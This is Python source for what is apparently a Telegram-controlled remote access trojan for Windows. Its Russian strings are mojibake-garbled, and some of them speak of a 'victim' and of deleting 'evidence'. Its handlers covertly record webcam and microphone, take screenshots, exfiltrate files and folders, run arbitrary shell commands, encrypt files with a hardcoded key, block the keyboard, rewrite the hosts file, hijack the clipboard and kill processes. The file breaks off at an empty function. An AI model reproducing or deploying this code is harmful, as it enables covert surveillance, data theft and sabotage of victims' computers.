# ---- Imports ---- #
import webbrowser
from PIL import ImageGrab
from time import sleep
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram import types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
import os
import shutil
import random
from cv2 import VideoWriter
from cv2 import VideoWriter_fourcc
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import cv2
import pyautogui as p
from ctypes import cast, POINTER
import ctypes
import struct
from cryptography.fernet import Fernet
import keyboard
import pyperclip
import pyttsx3
import win32api
import win32con
# ---- Imports ---- #

class Steps(StatesGroup):
    stepURL = State()
    stepMakeDir = State()
    stepRmTree = State()
    stepRmFile = State()

    stepRename = State()
    stepRename2 = State()
    
    stepReplace = State()
    stepReplace2 = State()

    stepMsg = State()
    stepDwn = State()
    stepWeb = State()
    stepAu = State()
    stepSys = State()
    stepMouse = State()
    stepWall = State()
    stepChangeDir = State()
    stepSize = State()
    stepEncrypt = State()
    stepDecrypt = State()
    stepBlock = State()
    stepKB = State()
    stepBlockUrl = State()
    stepUnblockUrl = State()
    stepDWzip = State()
    stepChEx = State()
    stepClosePG = State()
    stepSayHello = State()
    stepRotate = State()
    stepCMD = State()
    stepWrite = State()

def Open_url(dp, bot, admin_id):
    @dp.message_handler(text_contains='–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É')
    async def open_url(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç ü§®')
            await Steps.stepURL.set()

    @dp.message_handler(state=Steps.stepURL)
    async def open_url_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, '–î–∞, –¥–∞, —è —É–∂–µ –æ—Ç–∫—Ä—ã–≤–∞—é —Ç–≤–æ—é —Å—Å—ã–ª–∫—É üîó')
            await state.update_data(
                {
                    'item': message.text
                }
            )

            webbrowser.open_new(message.text)
            sleep(2)
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_document(admin_id, f, caption='–í–æ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–∫—Ä—ã—Ç–æ–π —Å—Å—ã–ª–∫–∏')
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(admin_id, "–•–∑ –ø–æ—á–µ–º—É, –Ω–æ –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —É–ª–∏–∫–∏... –ù–∞–¥–µ—é—Å—å –Ω–∏–∫—Ç–æ –Ω–µ –∑–∞–º–µ—Ç–∏—Ç)\n<code>" + e + "</code>")
            await state.finish()

def ChangeDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å—Å—è –ø–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')
    async def changedir(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')
            await Steps.stepChangeDir.set()


    @dp.message_handler(state=Steps.stepChangeDir)
    async def makedir_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.chdir(message.text)
                ls = os.getcwd()
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–º–µ—Å—Ç–∏–ª—Å—è, –≤–æ—Ç —Ç–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è:\n<code>" + ls + "</code>", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def MakeDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É')
    async def makedir(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è –ø–∞–ø–∫–∏ ü§®')
            await Steps.stepMakeDir.set()


    @dp.message_handler(state=Steps.stepMakeDir)
    async def makedir_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.makedirs(message.text)
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–ª –ø–∞–ø–∫—É", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def RmTree(dp, bot, admin_id):
    @dp.message_handler(text_contains='–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É')
    async def rmtree(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è –ø–∞–ø–∫–∏ ü§®')
            await Steps.stepRmTree.set()


    @dp.message_handler(state=Steps.stepRmTree)
    async def rmtree_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                shutil.rmtree(message.text)
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª –ø–∞–ø–∫—É", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def RmFile(dp, bot, admin_id):
    @dp.message_handler(text_contains='–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª')
    async def rmtree(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è —Ñ–∞–π–ª–∞ ü§®')
            await Steps.stepRmFile.set()


    @dp.message_handler(state=Steps.stepRmFile)
    async def rmfile_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.remove(message.text)
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª —Ñ–∞–π–ª", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Rename(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å —Ñ–∞–π–ª')
    async def rename(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å –∏–∑–º–µ–Ω–∏—Ç—å ü§®', parse_mode='HTML')
            await Steps.stepRename.set()

    @dp.message_handler(state=Steps.stepRename)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item
            item = message.text
            await state.update_data(
                {
                    'item': message.text
                }
            )
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –Ω–∞ –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å –∏–∑–º–µ–Ω–∏—Ç—å', parse_mode='HTML')
            await Steps.stepRename2.set()

    @dp.message_handler(state=Steps.stepRename2)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item2
            item2 = message.text
            await state.update_data(
                {
                    'item2': message.text
                }
            )
            try:
                os.rename(item, item2)
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–ª —Ñ–∞–π–ª", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Replace(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª')
    async def replace(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å ü§®', parse_mode='HTML')
            await Steps.stepReplace.set()

    @dp.message_handler(state=Steps.stepReplace)
    async def replace_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item
            item = message.text
            await state.update_data(
                {
                    'item': message.text
                }
            )
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏', parse_mode='HTML')
            await Steps.stepReplace2.set()

    @dp.message_handler(state=Steps.stepReplace2)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item2
            item2 = message.text
            await state.update_data(
                {
                    'item2': message.text
                }
            )
            try:
                os.replace(item, item2)
                await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–º–µ—Å—Ç–∏–ª —Ñ–∞–π–ª", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Msg(dp, bot, admin_id):
    @dp.message_handler(text_contains='–û–∫–Ω–æ —Å —Ç–µ–∫—Å—Ç–æ–º')
    async def msg(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏–µ ü§®')
            await Steps.stepMsg.set()


    @dp.message_handler(state=Steps.stepMsg)
    async def msg_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                ctypes.windll.user32.MessageBoxW(0, message.text, u'', 0x1000)
                screen = ImageGrab.grab()
                screen.save(os.getcwd() + '\\sreenshot.jpg')
                f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
                await bot.send_document(admin_id, f, caption='–í–æ—Ç —Ç–≤–æ–π —Ç–µ–∫—Å—Ç')
                try:
                    os.remove(os.getcwd() + '\\sreenshot.jpg')
                except Exception as e:
                    await bot.send_message(admin_id, e)

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Dwn(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª')
    async def dwn(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è —Ñ–∞–π–ª—è, —â–∞ —Å–∫–∞—á–∞–µ–º ü§®')
            await Steps.stepDwn.set()


    @dp.message_handler(state=Steps.stepDwn)
    async def dwn_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                f = open(message.text, 'rb')
                await bot.send_document(admin_id, f)
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Web(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–ø–∏—Å—å —Å –≤–µ–±–∫–∏')
    async def web(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö, –Ω—É–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø—Ä–æ—Å—Ç–æ —Ü–∏—Ñ—Ä—ã!')
            await Steps.stepWeb.set()


    @dp.message_handler(state=Steps.stepWeb)
    async def web_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 26
                webcam = cv2.VideoCapture(0)
                video = VideoWriter('webcam.avi', VideoWriter_fourcc(*'MP42'), 25.0, (640, 480))
                for x in range(1, duration):
                    stream_ok, frame = webcam.read()
                    if stream_ok:
                        video.write(frame)

                await bot.send_document(admin_id, open('webcam.avi', 'rb'))
                cv2.destroyAllWindows()
                webcam.release()
                video.release()
                try:
                    os.remove('webcam.avi')
                except:
                    pass
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()






def Au(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ')
    async def au(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö, –Ω—É–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø—Ä–æ—Å—Ç–æ —Ü–∏—Ñ—Ä—ã!')
            await Steps.stepAu.set()


    @dp.message_handler(state=Steps.stepAu)
    async def au_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 44

                audio = pyaudio.PyAudio()
                stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
                frames = []

                for i in range(1, duration):
                    data = stream.read(1024)
                    frames.append(data)

                stream.stop_stream()
                stream.close()
                audio.terminate()
                sound_file = wave.open('audio.wav', 'wb')
                sound_file.setnchannels(1)
                sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                sound_file.setframerate(44100)
                sound_file.writeframes(b''.join(frames))
                sound_file.close()
                await bot.send_document(admin_id, open('audio.wav', 'rb'))



                try:
                    os.remove('audio.wav')
                except:
                    pass
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Sys(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª')
    async def sys(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å –∑–∞–ø—É—Å—Ç–∏—Ç—å. –û–Ω–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –∞–±—Å–æ–ª—é—Ç–Ω—ã–º ü§®')
            await Steps.stepSys.set()


    @dp.message_handler(state=Steps.stepSys)
    async def sys_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.system(message.text)
                sleep(1)
                screen = ImageGrab.grab()
                screen.save(os.getcwd() + '\\sreenshot.jpg')
                f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
                await bot.send_document(admin_id, f, caption='–ó–∞–ø—É—Å—Ç–∏–ª)))')

                try:
                    os.remove(os.getcwd() + '\\sreenshot.jpg')
                except Exception as e:
                    await bot.send_message(admin_id, e)
            
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Mouse(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–≤–µ—Å—Ç–∏ —Å —É–º–∞ –∫—É—Ä—Å–æ—Ä')
    async def mouse(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
            await Steps.stepMouse.set()


    @dp.message_handler(state=Steps.stepMouse)
    async def mouse_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 17
                for x in range(1, duration):
                    p.moveTo(random.randint(0,500),random.randint(0,500))
                await bot.send_message(admin_id, '–û—Ç–ª–∏—á–Ω–æ, –≤—Å—ë –∑–∞–∫–æ–Ω—á–∏–ª–æ—Å—å –≤–µ—Å–µ–ª–æ)')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Wall(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–æ–º–µ–Ω—è—Ç—å –æ–±–æ–∏')
    async def wall(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–æ—Ç–æ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º')
            await Steps.stepWall.set()


    @dp.message_handler(state=Steps.stepWall)
    async def wall_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                PATH = os.getcwd() + '\\' + message.text
                SPI_SETDESKWALLPAPER = 20
                def is_64bit_windows():
                    return struct.calcsize('P') * 8 == 64

                def changeBG(path):
                    if is_64bit_windows():
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)
                    else:
                        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)

                changeBG(PATH)
                await bot.send_message(admin_id, '–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ —Å–º–µ–Ω–µ–Ω—ã!')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Encrypt(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å')
    async def encrypt(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å')
            await Steps.stepEncrypt.set()


    @dp.message_handler(state=Steps.stepEncrypt)
    async def encrypt_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                key = b'Lr9W2qlJw-IJHtfA87_epWlyndlOZBJD-8UzYCjkHBA='
                f = Fernet(key)
                with open(message.text, 'rb') as file:
                    file_data = file.read()
                
                encrypted_data = f.encrypt(file_data)
                
                with open(message.text, 'wb') as file:
                    file.write(encrypted_data)

                await bot.send_message(admin_id, '–§–∞–π–ª, —É—Å–ø–µ—à–Ω–æ –±—ã–ª –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Decrypt(dp, bot, admin_id):
    @dp.message_handler(text_contains='–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å')
    async def decrypt(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—á–µ—à—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å')
            await Steps.stepDecrypt.set()


    @dp.message_handler(state=Steps.stepDecrypt)
    async def decrypt_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                key = b'Lr9W2qlJw-IJHtfA87_epWlyndlOZBJD-8UzYCjkHBA='
                f = Fernet(key)

                with open(message.text, 'rb') as file:
                    encrypted_data = file.read()

                decrypted_data = f.decrypt(encrypted_data)

                with open(message.text, 'wb') as file:
                    file.write(decrypted_data)

                await bot.send_message(admin_id, '–§–∞–π–ª, —É—Å–ø–µ—à–Ω–æ –±—ã–ª —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Get_size(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–æ–ª—É—á–∏—Ç—å —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞')
    async def get_size(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞')
            await Steps.stepSize.set()


    @dp.message_handler(state=Steps.stepSize)
    async def get_size_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                size = os.stat(message.text).st_size

                dct = {'b':1024, 'K' : 1024 ** 2, 'M' : 1024 ** 3, 'G' :  1024 ** 4}
                 
                ci = 'b'
                num = int(size)
                 
                m_num = num * dct[ci]
                ret = [m_num / x[1] for x in dct.items() if x[0] != ci]
                ret = '%.3f' % ret[1]
                await bot.send_message(admin_id, '–§–∞–π–ª, –≤–µ—Å–∏—Ç ' + str(ret) + "–º–±")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def BLkeyboard(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É')
    async def blkeyboard(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏, 150 —ç—Ç–æ –æ—á–µ–Ω—å –¥–æ–ª–≥–æ. –•–∑ –Ω–∞ —Å–∫–æ–ª—å–∫–æ.')
            await Steps.stepKB.set()


    @dp.message_handler(state=Steps.stepKB)
    async def blkeyboard_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                duration = int(message.text)
                if duration > 150:
                    await bot.send_message(admin_id, '–ß—É–≤–∞–∫ —ç—Ç–æ —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ...')
                else:
                    await bot.send_message(admin_id, '–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã, –Ω–∞—á–∞—Ç–∞!')
                    for i in range(0, duration):
                        keyboard.block_key(i)
                    await bot.send_message(admin_id, '–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã, —É—Å–ø–µ—à–Ω–æ –±—ã–ª–∞ –æ–∫–æ–Ω–æ—á–µ–Ω–Ω–∞')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            


def BlockUrl(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–∞–π—Ç—É')
    async def blockurl(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç. –ë–µ–∑ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞, http –∏ https.\ntelegram.org - –ü—Ä–∞–≤–∏–ª—å–Ω–æ\nhttps://telegram.org/ - –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ')
            await Steps.stepBlockUrl.set()


    @dp.message_handler(state=Steps.stepBlockUrl)
    async def blockurl_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                hosts = r'C:\Windows\System32\drivers\etc\hosts'
                redirect_url = '127.0.0.1'
                blocked_sites = [message.text]
                with open(hosts, 'r+') as file:
                    src = file.read()
                    for site in blocked_sites:
                        if site in src:
                            await bot.send_message(admin_id, '–≠—Ç–æ—Ç —Å–∞–π—Ç —É–∂–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω')
                        else:
                            file.write(f'{redirect_url} {site}\n')
                            await bot.send_message(admin_id, '–≠—Ç–æ—Ç —Å–∞–π—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω')

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)





def DWzip(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–∫–∞—á–∞—Ç—å –ø–∞–ø–∫—É')
    async def dwzip(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è –ø–∞–ø–∫–∏')
            await Steps.stepDWzip.set()


    @dp.message_handler(state=Steps.stepDWzip)
    async def dwzip_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                item = message.text
                RandomName = random.randint(0,10000)
                shutil.make_archive(f'archive{RandomName}', 'zip', item)

                await bot.send_document(admin_id, open(f'archive{RandomName}.zip', 'rb'))


                os.remove(f'archive{RandomName}.zip')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)




def ChEx(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–º–µ–Ω–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
    async def chex(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Ç–µ–∫—Å—Ç –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—á–µ—à—å –∑–∞–º–µ–Ω–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
            await Steps.stepChEx.set()


    @dp.message_handler(state=Steps.stepChEx)
    async def chex_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                pyperclip.copy(message.text)
                await bot.send_message(admin_id, '–¢–µ–∫—Å—Ç —É—Å–ø–µ—à–Ω–æ –±—ã–ª —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω')

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)


def ClosePG(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É(–ü—Ä–æ—Ü–µ—Å—Å)')
    async def closepg(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ç–∏–ø–∞:\n<code>Taskmgr.exe</code>', parse_mode='HTML')
            await Steps.stepClosePG.set()


    @dp.message_handler(state=Steps.stepClosePG)
    async def closepg_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()

            a = os.system(f'taskkill /im {message.text}')
            if a == 128:
                await bot.send_message(admin_id, '–¢–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –∑–∞–ø—É—â–µ–Ω')
            elif a == 0:
                await bot.send_message(admin_id, '–ü—Ä–æ—Ü–µ—Å—Å —É—Å–ø–µ—à–Ω–æ –±—ã–ª –∑–∞–∫—Ä—ã—Ç')
            elif a == 1:
                await bot.send_message(admin_id, '–ñ–µ—Ä—Ç–≤–∞ –Ω–µ –∑–∞–ø—É—Å—Ç–∏–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º—É –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞')


def SayHello(dp, bot, admin_id):
